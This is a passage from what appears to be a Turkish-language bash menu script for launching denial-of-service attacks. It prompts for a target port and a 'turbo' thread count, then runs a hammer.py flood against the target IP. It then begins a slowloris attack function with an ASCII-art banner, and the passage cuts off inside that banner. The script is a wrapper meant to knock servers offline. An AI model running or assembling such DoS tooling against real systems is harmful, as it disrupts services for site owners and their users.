echo "HEDEF PORT :"
read port
echo "TURBO [135] :"
read turbo
./hammer.py -s $ip -p $port -t $turbo
}

slowloris()
{
    clear
    echo -e " ${BLUE} "
	echo "███████╗██╗      ██████╗ ██╗    ██╗██╗      ██████╗ ██████╗ ██╗███████╗"
    echo "██╔════╝██║     ██╔═══██╗██║    ██║██║     ██╔═══██╗██╔══██╗██║██╔════╝"
    echo "███████╗██║     ██║   ██║██║ █╗ ██║██║     ██║   ██║██████╔╝██║███████╗"
    echo "╚════██║██║     ██║   ██║██║███╗██║██║     ██║   ██║██╔══██╗██║╚════██║"
    echo "███████║███████╗╚██████╔╝╚███╔███╔╝███████╗╚██████╔╝██║  ██║██║███████║"
    echo "╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝"
    echo "  +-----------------------------------------------------------------------+ "
